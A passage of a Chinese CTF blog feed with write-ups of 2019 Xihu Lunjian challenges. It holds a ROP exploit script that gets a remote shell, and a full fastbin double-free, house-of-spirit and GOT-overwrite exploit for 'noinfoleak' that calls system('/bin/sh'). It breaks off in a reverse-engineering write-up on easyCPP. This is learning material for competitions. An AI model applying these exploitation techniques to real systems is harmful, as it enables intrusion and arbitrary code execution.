class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">s=remote(<span class="string">'1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com'</span>,<span class="number">57856</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getaddr</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="keyword">if</span> int(re,<span class="number">16</span>)&lt;=<span class="number">15</span>:</span><br><span class="line">addr=<span class="string">"0"</span>+hex(int(re,<span class="number">16</span>))[<span class="number">2</span>:]+addr</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">addr=str(hex(int(re,<span class="number">16</span>)))[<span class="number">2</span>:]+addr</span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(re,<span class="number">16</span>)))</span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="comment">#addr=str(hex(int(re,16)))[2:]+addr</span></span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(addr,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">'name:'</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">b11_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">b11_addr=getaddr(<span class="number">344</span>+i,b11_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"b11_addr:"</span>+b11_addr</span><br><span class="line"></span><br><span class="line">base_addr=int(b11_addr,<span class="number">16</span>)<span class="number">-0xb11</span></span><br><span class="line"><span class="comment">#system_plt=base_addr+elf.plt['system']</span></span><br><span class="line">popedi_addr=base_addr+<span class="number">0xd03</span></span><br><span class="line"></span><br><span class="line">stack_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">stack_addr=getaddr(<span class="number">344</span><span class="number">-8</span>+i,stack_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr:"</span>+stack_addr</span><br><span class="line"></span><br><span class="line">bin_addr=int(stack_addr,<span class="number">16</span>)<span class="number">-0x100</span></span><br><span class="line"></span><br><span class="line">libc_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">libc_addr=getaddr(<span class="number">632</span>+i,libc_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_addr:"</span>+libc_addr</span><br><span class="line"></span><br><span class="line">libca=int(libc_addr,<span class="number">16</span>)<span class="number">-240</span><span class="number">-0x20740</span></span><br><span class="line">system_plt=libca+<span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line">bad=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"do you want continue(yes/no)?"</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">popedi=str(hex(popedi_addr)[<span class="number">2</span>:])</span><br><span class="line">popedi=popedi.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+i,popedi[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">bin=str(hex(bin_addr)[<span class="number">2</span>:])</span><br><span class="line">bin=bin.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">8</span>+i,bin[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">syst=str(hex(system_plt)[<span class="number">2</span>:])</span><br><span class="line">syst=syst.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system:"</span>+syst</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">16</span>+i,syst[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">24</span>+i,hex(ord(bin_sh[(i):(i+<span class="number">1</span>)]))[<span class="number">2</span>:])</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><p>结果就成功拿到进入shell，这次比赛比较奇怪，拿到shell后弹出的是congritulation，然后输入token值就拿到flag了，不懂是怎么实现的，原本我还想现学现写个Dynelf的leak函数来搜索内存的，就是在puts后面再放个libc_start的地址，构成一个可以不断循环的leak函数，然后调用Dynelf函数就能搜索指定的函数起始地址了。</p><p>第二天看了眼babypwn没思路，加上有事就没打了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-18-noinfoleak</title>
      <link href="/passages/2019-4-18-noinfoleak/"/>
      <url>/passages/2019-4-18-noinfoleak/</url>
      
        <content type="html"><![CDATA[<h2 id="2019西湖论剑杯pwn-noinfoleak"><a href="#2019西湖论剑杯pwn-noinfoleak" class="headerlink" title="2019西湖论剑杯pwn-noinfoleak"></a>2019西湖论剑杯pwn-noinfoleak</h2><p>这题在比赛的时候没能做出来，借着这道题学习一下fastbin attack的doublefree和house of spirit<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400846();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">          v4 = sub_4008A7();</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          add();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No Such Choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>题目逻辑很清楚，就三个功能，添加表，编辑表，删除表，漏洞在删除表<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">  v0 = sub_4008A7();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">15</span> )</span><br><span class="line">    <span class="built_in">free</span>(qword_6010A0[<span class="number">2</span> * v0]);<span class="comment">//free后没有置0，存在uaf</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里可以使用fastbin的double free实现任意地址写，大致原理就是：fastbin是一个后进先出（LIFO）的单向链表，chunk大小包含16-80byte，只有一个fd指针，当我们malloc两个chunk，然后按照第一、第二、第一的顺序free，就会发现两个chunk的fd各自指向对方，这就存在double free。<br>这时候只要使用house of spirit技术，也就是申请相同大小的栈，并且加上数据fake_chunk_addr，然后接着再连续申请两次，第四次申请的时候就会把fake_chunk_addr作为一个chunk分配给你。<br>fake_chunk_addr只要满足几个条件，其中一个是fake_chunk_addr的size段要符合fastbin，而且要满足malloc的要求，这一题只需要知道这两点（其它条件我一时搞不明白），这里所谓的double free就是两次free同一个chunk从而能分配到一个fake_chunk，但是不能连续free同一个chunk两个，这会触发警报，而且free的chunk的fd不能指向自身。<br>这一题我们会发现在index数组(0x6010a0)的上方0x60108d处有一个0x7f，正好符合fastbin的size，我们可以利用double free使得(0x60108d-8)进入index数组，然后通过edit函数对(0x60108d-8）进行写入，然后就能随意地修改index数组，让各个index指向我们想要的地址。<br>虽然能进行任意写了，但是这题没有能泄露信息的函数，这就需要我们自己构造info leak了，其中一个方法是把已有的函数比如free的got表内容改成puts_plt，这样调用free时就会变成free-&gt;free_plt-&gt;free_got-&gt;puts_plt-&gt;puts_got（这里的原理我不清楚）,从而调用puts，这时候index数组的地址值原本是在delete函数中作为free的参数的，现在变成了puts的参数，因此我们可以把puts_got的值通过之前的house of spirit放入index数组中，然后更改free_got表，之后调用delete函数就能泄露出puts的实际地址了（got表中存储着函数的真实地址），然后就能计算base_addr，之后得到system_addr，把free_got的内容再修改成system_addr的值，这时候add(0x20,”/bin/sh\00”)，那么index数组里面就多出了一个/bin/sh字符串的地址，再调用delete就好了。<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ["tmux", "splitw", "-h"] </span></span><br><span class="line">sh=process(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">putsPlt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">putsGot=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">freeGot=elf.got[<span class="string">'free'</span>]</span><br><span class="line">log.info(<span class="string">'puts:%x'</span>%(putsPlt))</span><br><span class="line">log.info(<span class="string">'free:%x'</span>%(freeGot))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(Size,context)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(Size))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,context)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.send(context)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">add(<span class="number">96</span>,<span class="string">'aaaa'</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">96</span>,<span class="string">'bbbb'</span>)  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">dele(<span class="number">0</span>)  </span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">targetAddr=p64(<span class="number">0x60108d</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,targetAddr) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'cccc'</span>)     <span class="comment">#4</span></span><br><span class="line"><span class="comment">#fake chunk to bss</span></span><br><span class="line">payload=<span class="string">'\x00'</span>*(<span class="number">3</span>+<span class="number">16</span>)+p64(freeGot)+p64(<span class="number">96</span>)+p64(putsGot)+p64(<span class="number">96</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)   <span class="comment">#5  </span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(putsPlt))  <span class="comment"># freeGot-&gt;putsPlt</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#puts(putsAddr)</span></span><br><span class="line">putsaddr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.info(<span class="string">'putsAddr:%x'</span>%(putsaddr))</span><br><span class="line">libcAddr=putsaddr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">'libcAddr:%x'</span>%(libcAddr))</span><br><span class="line">systemAddr=libcAddr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'systemAddr:%x'</span>%(systemAddr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(systemAddr)) <span class="comment"># freeGot-&gt;system</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>) <span class="comment">#6</span></span><br><span class="line">dele(<span class="number">6</span>)   <span class="comment"># system('/bin/sh')</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>该脚本来自 <a href="https://blog.tangent.ink/" target="_blank" rel="noopener">https://blog.tangent.ink/</a><br>我只做了很小的修改以适应我系统的堆栈，网上找的脚本没有一个能在我kali本地跑的，也不懂得为什么，因为20还有一场比赛，所以对fastbin attack的学习先到这里。<br>遗留困惑:<br>1、double free到底能分配什么样的地址？因为我实际很多地址不能用double free，都会直接在heap里给我分配。<br>2、house of spirit对fake chunk的审查机制具体是怎么样的？为什么0x7f可以满足对size的检查，这里我有查到一篇 <a href="https://www.jianshu.com/p/1c4fab29ea34" target="_blank" rel="noopener">https://www.jianshu.com/p/1c4fab29ea34</a> 讲了自己实验的几个size，似乎后四位是f就能满足size的检查了？具体我也不太明白，因为我自己实验的0x60不知道为什么不能满足。<br>3、got、plt我虽然有经过学习，但是实际具体的函数是怎样的我并没有完全弄清，像这次的连续两次plt got我就不理解是怎么实现的，按理来说got表里应该是实际地址，希望之后阅读《程序员的自我修养》能理解这一点<br>4、在我看的七八个EXP里，有用到unsortbin、IO_FILE、uaf等技术，因为我实验了好久都难以复现，所以留在困惑里。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-17-近期比赛总结</title>
      <link href="/passages/2019-4-17-%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
      <url>/passages/2019-4-17-%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="2019西湖论剑杯-re-easyCPP"><a href="#2019西湖论剑杯-re-easyCPP" class="headerlink" title="2019西湖论剑杯-re-easyCPP"></a>2019西湖论剑杯-re-easyCPP</h2><p>这题的难点在对C++的STL容器的了解<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T&gt; values;<span class="comment">//创建存放T类型元素的vertor容器。</span></span><br><span class="line"><span class="built_in">vector</span>&lt;T&gt;(向量容器)是一个长度可变的序列，用来存放 T 类型的对象。必要时，可以自动增加容量，但只能在序列的末尾高效地增加或删除元素。</span><br><span class="line">values.push_back();<span class="comment">//在序列的末尾添加一个元素</span></span><br><span class="line">back_inserter();<span class="comment">//创建一个使用push_back的迭代器，把一个vector容器的元素按顺序传递给另一个vector</span></span><br><span class="line">value.end();<span class="comment">//指向value最后一个元素的下一个元素</span></span><br><span class="line">value.begin();<span class="comment">//指向value的第一个元素</span></span><br><span class="line">value.back();<span class="comment">//指向value的最后一个元素</span></span><br><span class="line">transform();<span class="comment">//可以将函数应用到序列的元素上，并将这个函数返回的值保存到另一个序列中，它返回的迭代器指向输出序列所保存的最后一个元素的下一个位置。 </span></span><br><span class="line"><span class="function">OutputIterator <span class="title">transform</span> <span class="params">(InputIterator first1,InputIterator last1,OutputIterator result, UnaryOperation op)</span></span>;</span><br><span class="line">对于一元操作，将op应用于[first1, last1]范围内的每个元素，并将每个操作返回的值存储在以result开头的范围内。给定的op将被连续调用last1-first1+<span class="number">1</span>次。op可以是函数指针或函数对象或lambda表达式。</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">v10 = argv;</span><br><span class="line">v21 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v13);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v14);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v16);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v17);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v20[<span class="number">4</span> * i], v10);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back((__int64)&amp;v14, (__int64)&amp;v20[<span class="number">4</span> * i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v19) = fib(j);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v13, &amp;v19);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back((__int64)&amp;v15, (__int64)v20);</span><br><span class="line">v3 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;((__int64)&amp;v15);</span><br><span class="line">v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v14);</span><br><span class="line">v19 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line">v5 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v19, <span class="number">1L</span>L);</span><br><span class="line"><span class="built_in">std</span>::transform&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;&gt;(</span><br><span class="line">  v5,</span><br><span class="line">  v4,</span><br><span class="line">  v3,</span><br><span class="line">  (__int64)v20);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>((__int64)&amp;v18);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v15);</span><br><span class="line"><span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;((<span class="keyword">unsigned</span> __int64)&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v16, &amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span 